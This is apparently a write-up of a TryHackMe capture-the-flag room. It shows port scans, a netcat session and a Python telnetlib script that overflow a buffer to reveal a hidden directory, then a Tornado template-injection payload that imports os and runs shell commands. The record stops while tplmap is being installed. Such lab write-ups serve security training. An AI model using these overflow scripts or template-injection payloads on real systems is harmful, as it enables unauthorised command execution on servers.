---
Buffer overflow, server-side template injection and more...
---

![](https://i.imgur.com/tQ1lamt.png)

![](https://tryhackme-images.s3.amazonaws.com/room-icons/c4369baddbda8811b45fa5443feb81b4.jpg)

###   Flags

 Start Machine

P.S. Challenge may a take up to 5 minutes to boot up and configure!

Answer the questions below

```bash
┌──(kali㉿kali)-[~/Downloads]
└─$ rustscan -a 10.10.163.81 --ulimit 5500 -b 65535 -- -A -Pn
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
😵 https://admin.tryhackme.com

[~] The config file is expected to be at "/home/kali/.rustscan.toml"
[~] Automatically increasing ulimit value to 5500.
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
Open 10.10.163.81:22
Open 10.10.163.81:80
Open 10.10.163.81:2222
Open 10.10.163.81:9090
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
[~] Starting Nmap 7.93 ( https://nmap.org ) at 2023-01-20 12:45 EST
NSE: Loaded 155 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 12:45
Completed NSE at 12:45, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 12:45
Completed NSE at 12:45, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 12:45
Completed NSE at 12:45, 0.00s elapsed
Initiating Parallel DNS resolution of 1 host. at 12:45
Completed Parallel DNS resolution of 1 host. at 12:45, 0.02s elapsed
DNS resolution of 1 IPs took 0.04s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating Connect Scan at 12:45
Scanning 10.10.163.81 [4 ports]
Discovered open port 22/tcp on 10.10.163.81
Discovered open port 2222/tcp on 10.10.163.81
Discovered open port 9090/tcp on 10.10.163.81
Discovered open port 80/tcp on 10.10.163.81
Completed Connect Scan at 12:45, 0.19s elapsed (4 total ports)
Initiating Service scan at 12:45
Scanning 4 services on 10.10.163.81
Completed Service scan at 12:47, 105.61s elapsed (4 services on 1 host)
NSE: Script scanning 10.10.163.81.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 12:47
NSE Timing: About 99.82% done; ETC: 12:48 (0:00:00 remaining)
Completed NSE at 12:48, 30.32s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 12:48
Completed NSE at 12:48, 1.77s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 12:48
Completed NSE at 12:48, 0.00s elapsed
Nmap scan report for 10.10.163.81
Host is up, received user-set (0.19s latency).
Scanned at 2023-01-20 12:45:51 EST for 138s

PORT     STATE SERVICE       REASON  VERSION
22/tcp   open  ssh           syn-ack OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 12573fcc8639043bf0e646bf7251640b (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC1+fzUNMdVOD1RLT2OU1iOC5Av68TQ5E7Jy2x1IPhvOHkU8fzeWJBnAPZuxckO2mtmFL73m4mIRo4nyYmlBrTM090Hyg+P+yJUuqepuTLdjXgZW/e1YvmFXoQUXVEencwBLN3dvYJ0t+Jvu4rfCbeyzHfUkTrt6tzxaX3go8FKjVKuYMNq7frgTSWiO/k3rik1MNy4IedQOmKOCwxxAGdXXy+VcGtUAOWlIod6pBIU4CCEQJxE146xEIQI1czJuHrHXombZzfk9Ov+pY2NloxEORPQ2/sRD2+uYnfl4OBWM/uupeY4doRF5futdZ7u5XP+aHSSMRieBRMsgFuR1her
|   256 810575ad788362b206415be5a5a9824d (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBMgGIaiwLHXLXGtioB2ZXuN/bkckCNW8ddroXERn3jIVjGjvDOZJY+J9bR/n2bqa601xbGQLbK8cXsfu4/SjqD4=
|   256 0f8d0e19e9c7cc1439e934605cf7aafe (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAINcfH8RQ/iANAMirzQDTd9DqQWtaRghdHwVVrAou0c+j
80/tcp   open  http          syn-ack Apache httpd 2.4.18 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.18 (Ubuntu)
2222/tcp open  EtherNetIP-1? syn-ack
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, GenericLines, NULL, SSLSessionReq, TerminalServerCookie: 
|     Welcome to the NoNameCTF!
|     Choose an action:
|     regiser: 1
|     login: 2
|     get_secret_directory: 3
|     store_your_buffer: 4
|   GetRequest, HTTPOptions, Help, RTSPRequest: 
|     Welcome to the NoNameCTF!
|     Choose an action:
|     regiser: 1
|     login: 2
|     get_secret_directory: 3
|     store_your_buffer: 4
|     Wrong option
|_    Good bye
9090/tcp open  http          syn-ack Tornado httpd 6.0.3
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Site doesn't have a title (text/plain).
|_http-server-header: TornadoServer/6.0.3
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port2222-TCP:V=7.93%I=7%D=1/20%Time=63CAD356%P=x86_64-pc-linux-gnu%r(NU
SF:LL,7B,"Welcome\x20to\x20the\x20NoNameCTF!\r\nChoose\x20an\x20action:\r\
SF:n>\x20regiser:\x201\r\n>\x20login:\x202\r\n>\x20get_secret_directory:\x
SF:203\r\n>\x20store_your_buffer:\x204\r\n")%r(GenericLines,7B,"Welcome\x2
SF:0to\x20the\x20NoNameCTF!\r\nChoose\x20an\x20action:\r\n>\x20regiser:\x2
SF:01\r\n>\x20login:\x202\r\n>\x20get_secret_directory:\x203\r\n>\x20store
SF:_your_buffer:\x204\r\n")%r(GetRequest,93,"Welcome\x20to\x20the\x20NoNam
SF:eCTF!\r\nChoose\x20an\x20action:\r\n>\x20regiser:\x201\r\n>\x20login:\x
SF:202\r\n>\x20get_secret_directory:\x203\r\n>\x20store_your_buffer:\x204\
SF:r\nWrong\x20option\r\nGood\x20bye\r\n")%r(HTTPOptions,93,"Welcome\x20to
SF:\x20the\x20NoNameCTF!\r\nChoose\x20an\x20action:\r\n>\x20regiser:\x201\
SF:r\n>\x20login:\x202\r\n>\x20get_secret_directory:\x203\r\n>\x20store_yo
SF:ur_buffer:\x204\r\nWrong\x20option\r\nGood\x20bye\r\n")%r(RTSPRequest,9
SF:3,"Welcome\x20to\x20the\x20NoNameCTF!\r\nChoose\x20an\x20action:\r\n>\x
SF:20regiser:\x201\r\n>\x20login:\x202\r\n>\x20get_secret_directory:\x203\
SF:r\n>\x20store_your_buffer:\x204\r\nWrong\x20option\r\nGood\x20bye\r\n")
SF:%r(DNSVersionBindReqTCP,7B,"Welcome\x20to\x20the\x20NoNameCTF!\r\nChoos
SF:e\x20an\x20action:\r\n>\x20regiser:\x201\r\n>\x20login:\x202\r\n>\x20ge
SF:t_secret_directory:\x203\r\n>\x20store_your_buffer:\x204\r\n")%r(DNSSta
SF:tusRequestTCP,7B,"Welcome\x20to\x20the\x20NoNameCTF!\r\nChoose\x20an\x2
SF:0action:\r\n>\x20regiser:\x201\r\n>\x20login:\x202\r\n>\x20get_secret_d
SF:irectory:\x203\r\n>\x20store_your_buffer:\x204\r\n")%r(Help,93,"Welcome
SF:\x20to\x20the\x20NoNameCTF!\r\nChoose\x20an\x20action:\r\n>\x20regiser:
SF:\x201\r\n>\x20login:\x202\r\n>\x20get_secret_directory:\x203\r\n>\x20st
SF:ore_your_buffer:\x204\r\nWrong\x20option\r\nGood\x20bye\r\n")%r(SSLSess
SF:ionReq,7B,"Welcome\x20to\x20the\x20NoNameCTF!\r\nChoose\x20an\x20action
SF::\r\n>\x20regiser:\x201\r\n>\x20login:\x202\r\n>\x20get_secret_director
SF:y:\x203\r\n>\x20store_your_buffer:\x204\r\n")%r(TerminalServerCookie,7B
SF:,"Welcome\x20to\x20the\x20NoNameCTF!\r\nChoose\x20an\x20action:\r\n>\x2
SF:0regiser:\x201\r\n>\x20login:\x202\r\n>\x20get_secret_directory:\x203\r
SF:\n>\x20store_your_buffer:\x204\r\n");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 12:48
Completed NSE at 12:48, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 12:48
Completed NSE at 12:48, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 12:48
Completed NSE at 12:48, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 139.83 seconds


view-source:http://10.10.163.81/

<!--char buffer[250]; -->
<!--A*1000-->
        checkme!

view-source:http://10.10.163.81:2222/

Welcome to the NoNameCTF!
Choose an action:
> regiser: 1
> login: 2
> get_secret_directory: 3
> store_your_buffer: 4
Wrong option
Good bye

view-source:http://10.10.163.81:9090/

Traceback (most recent call last):
  File "/home/zeldris/.local/lib/python3.5/site-packages/tornado/web.py", line 1676, in _execute
    result = self.prepare()
  File "/home/zeldris/.local/lib/python3.5/site-packages/tornado/web.py", line 2431, in prepare
    raise HTTPError(self._status_code)
tornado.web.HTTPError: HTTP 404: Not Found

┌──(kali㉿kali)-[~/noname_ctf]
└─$ nc 10.10.163.81 2222
Welcome to the NoNameCTF!
Choose an action:
> regiser: 1
> login: 2
> get_secret_directory: 3
> store_your_buffer: 4
1
Enter an username:witty
Enter a password:witty
Sorry, password too short
Choose an action:
> regiser: 1
> login: 2
> get_secret_directory: 3
> store_your_buffer: 4
2
Username:witty
Password:witty
You're now authenticated!
Choose an action:
> regiser: 1
> login: 2
> get_secret_directory: 3
> store_your_buffer: 4
3
My secret in the port 9090 is: 
Choose an action:
> regiser: 1
> login: 2
> get_secret_directory: 3
> store_your_buffer: 4
4
Enter your buffer:A*1000
Flag saved!
Choose an action:
> regiser: 1
> login: 2
> get_secret_directory: 3
> store_your_buffer: 4
3
My secret in the port 9090 is: A*1000
Choose an action:
> regiser: 1
> login: 2
> get_secret_directory: 3
> store_your_buffer: 4

>>> print("A"*1998)
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

┌──(kali㉿kali)-[~/noname_ctf]
└─$ nc 10.10.163.81 2222
Welcome to the NoNameCTF!
Choose an action:
> regiser: 1
> login: 2
> get_secret_directory: 3
> store_your_buffer: 4
1
Enter an username:A*1998
Enter a password:A*1998
User A*1998 successfully registered. You can login now!
Choose an action:
> regiser: 1
> login: 2
> get_secret_directory: 3
> store_your_buffer: 4
2
Username:A*1998
Password:A*1998
You're now authenticated!
Choose an action:
> regiser: 1
> login: 2
> get_secret_directory: 3
> store_your_buffer: 4
3
My secret in the port 9090 is: 
Choose an action:
> regiser: 1
> login: 2
> get_secret_directory: 3
> store_your_buffer: 4
4
Enter your buffer:AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Flag saved!
Choose an action:
> regiser: 1
> login: 2
> get_secret_directory: 3
> store_your_buffer: 4
3
My secret in the port 9090 is: /40b5dffec4e39b7a3e9d261d2fc4a038/
Choose an action:
> regiser: 1
> login: 2
> get_secret_directory: 3
> store_your_buffer: 4

http://10.10.163.81:9090/40b5dffec4e39b7a3e9d261d2fc4a038/

┌──(kali㉿kali)-[~/noname_ctf]
└─$ nc 10.10.163.81 2222
Welcome to the NoNameCTF!
Choose an action:
> regiser: 1
> login: 2
> get_secret_directory: 3
> store_your_buffer: 4
1
Enter an username:a
Enter a password:a
Sorry, password too short
Choose an action:
> regiser: 1
> login: 2
> get_secret_directory: 3
> store_your_buffer: 4
2
Username:a
Password:a
You're now authenticated!
Choose an action:
> regiser: 1
> login: 2
> get_secret_directory: 3
> store_your_buffer: 4
3
My secret in the port 9090 is: 
Choose an action:
> regiser: 1
> login: 2
> get_secret_directory: 3
> store_your_buffer: 4
4
Enter your buffer:AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Flag saved!
Choose an action:
> regiser: 1
> login: 2
> get_secret_directory: 3
> store_your_buffer: 4
3
My secret in the port 9090 is: /40b5dffec4e39b7a3e9d261d2fc4a038/
Choose an action:
> regiser: 1
> login: 2
> get_secret_directory: 3
> store_your_buffer: 4

or

┌──(kali㉿kali)-[~/noname_ctf]
└─$ cat bof.py    
import telnetlib
import argparse

parser = argparse.ArgumentParser(description="BOF Exploit")
parser.add_argument("host", help="The host IP address")
parser.add_argument("port", help="The host port")
args=parser.parse_args()

#Read and write
def read(end_text):
	tn.read_until(end_text.encode())

def write(text):
	tn.write(("{0}\n".format(text)).encode())
#Connect
tn = telnetlib.Telnet(args.host, args.port)

#Register/Login
for i in range(1,3):
    read("4") #Listen for the end of the welcome message
    write(str(i)) #Pick an option (1 the first time, 2 the second)
    read(":") #Wait for the end of the username prompt
    write("jesus") #Enter Username
    read(":") #Wait for the end of the password prompt
    write("soon") #Enter password

#store buffer
read("4") #Listen for the end of the welcome message
write("4") #Pick option 4 to store a buffer
read(":") #Listen for the end of the buffer prompt
write("A"*1998) #Calculate and store the buffer

#complete overflow
read("4") #Listen for the end of the welcome message
write("3") #Pick option 3 to receive our secret directory
read("\n") #Work around to get rid of the newline preceeding response
print(tn.read_until("\n".encode()).decode()) #Output the directory
                                                                                                 
┌──(kali㉿kali)-[~/noname_ctf]
└─$ python3 bof.py 10.10.163.81 2222
My secret in the port 9090 is: /40b5dffec4e39b7a3e9d261d2fc4a038/


<html>
 <head><title> Hello  </title></head>
 <body><section class="inside"><h2>Cyber Security training made easy</h2></br>Hello  <p class='m0'>TryHackMe takes the pain out of learning and teaching Cybersecurity. Our platform makes it a comfortable experience to learn by designing prebuilt courses which include virtual machines (VM) hosted in the cloud ready to be deployed. This avoids the hassle of downloading and configuring VM's. Our platform is perfect for CTFs, Workshops, Assessments or Training.</p></section></section></div><div class="container main pb"><section class="row"><div class="col-md-4 green-hover"><h2><i class="fas fa-spider"></i> Hack Instantly</h2><p>Learn, practice and complete! Get hands on and practise your skills in a real-world environment by completing fun and difficult tasks. You can deploy VMs, which will give an IP address instantly and away you go.</p></div><div class="col-md-4 green-hover"><h2><i class="fas fa-door-closed"></i> Rooms</h2><p>Rooms are virtual areas dedicated to particular cyber security topics. For example, a room called "Hacking the Web" could be dedicated to web application vulnerabilities. </p></div><div class="col-md-4 green-hover"><h2><i class="fab fa-fort-awesome"></i> Tasks</h2><p>Each room has tasks that contain questions and hints, a custom leaderboard and chat area. Whilst you're hacking away, you can discuss hacking techniques or request help from others.</p><!-- ?hackme= --></div></section> 
</body>
</html>

<!-- ?hackme= -->

http://10.10.163.81:9090/40b5dffec4e39b7a3e9d261d2fc4a038/?hackme=whoami

Hello whoami 

https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection#tornado-python

https://ajinabraham.com/blog/server-side-template-injection-in-tornado

http://10.10.163.81:9090/40b5dffec4e39b7a3e9d261d2fc4a038/?hackme={{7*7}}

Hello 49 

{% import *module* %} - Allows you to import python modules.  

 Example:
{% import os %}{{ os.popen("whoami").read() }}

http://10.10.163.81:9090/40b5dffec4e39b7a3e9d261d2fc4a038/?hackme={%%20import%20os%20%}{{%20os.popen(%22whoami%22).read()%20}}

Hello zeldris 

https://github.com/epinna/tplmap

https://github.com/epinna/tplmap/issues/64

──(kali㉿kali)-[~/noname_ctf]
└─$ virtualenv -p python2.7 env
        
┌──(kali㉿kali)-[~/noname_ctf]
└─$ ls
bof.py  env
                                                                                              
┌──(kali㉿kali)-[~/noname_ctf]
└─$ cd env
                                                                                              
┌──(kali㉿kali)-[~/noname_ctf/env]
└─$ ls
bin  lib  pyvenv.cfg
                                                                                              
┌──(kali㉿kali)-[~/noname_ctf/env]
└─$ cd bin
                                                                                              
┌──(kali㉿kali)-[~/noname_ctf/env/bin]
└─$ ls
activate       activate.ps1      easy_install-2.7  pip-2.7  python2.7  wheel2.7
activate.csh   activate_this.py  easy_install2.7   pip2.7   wheel
activate.fish  easy_install      pip               python   wheel2
activate.nu    easy_install2     pip2              python2  wheel-2.7
                                                                                              
                                                      
┌──(kali㉿kali)-[~/noname_ctf/env/bin]
└─$ cd ../.. 

┌──(kali㉿kali)-[~/noname_ctf]
└─$ ls
bof.py  env
                                                                                              
┌──(kali㉿kali)-[~/noname_ctf]
└─$ source env/bin/activate
                                                                                              
┌──(env)─(kali㉿kali)-[~/noname_ctf]
└─$ git clone https://github.com/epinna/tplmap.git                                           
Cloning into 'tplmap'...
remote: Enumerating objects: 4127, done.
remote: Counting objects: 100% (50/50), done.
remote: Compressing objects: 100% (40/40), done.
remote: Total 4127 (delta 15), reused 33 (delta 10), pack-reused 4077
Receiving objects: 100% (4127/4127), 677.75 KiB | 1.39 MiB/s, done.
Resolving deltas: 100% (2694/2694), done.
                                                                                              
┌──(env)─(kali㉿kali)-[~/noname_ctf]
└─$ cd tplmap 
                                                                                              
┌──(env)─(kali㉿kali)-[~/noname_ctf/tplmap]
└─$ ls
burp_extension     config.yml  docker-envs  plugins    requirements.txt  tplmap.py
burp_extension.py  core        LICENSE.md   README.md  tests             utils
                                                                                              
┌──(env)─(kali㉿kali)-[~/noname_ctf/tplmap]
└─$ python2 -m pip install -r requirements.txt
DEPRECATION: Python 2.7 reached the end of its life on January 1st, 2020. Please upgrade your Python as Python 2.7 is no longer maintained. pip 21.0 will drop support for Python 2.7 in January 2021. More details about Python 2 support in pip can be found at https://pip.pypa.io/en/latest/development/release-process/#python-2-support pip 21.0 will remove support for this functionality.
Collecting PyYAML==5.1.2
  Using cached PyYAML-5.1.2.tar.gz (265 kB)
Collecting certifi==2018.10.15
  Using cached certifi-2018.10.15-py2.py3-none-any.whl (146 kB)
Collecting chardet==3.0.4
  Using cached chardet-3.0.4-py2.py3-none-any.whl (133 kB)
Collecting idna==2.8
  Using cached idna-2.8-py2.py3-none-any.whl (58 kB)
Collecting requests==2.22.0
  Using cached requests-2.22.0-py2.py3-none-any.whl (57 kB)
Collecting urllib3==1.24.1
  Using cached urllib3-1.24.1-py2.py3-none-any.whl (118 kB)
Requirement already satisfied: wsgiref==0.1.2 in /usr/lib/python2.7 (from -r requirements.txt (line 7)) (0.1.2)
Building wheels for collected packages: PyYAML
  Building wheel for PyYAML (setup.py) ... done
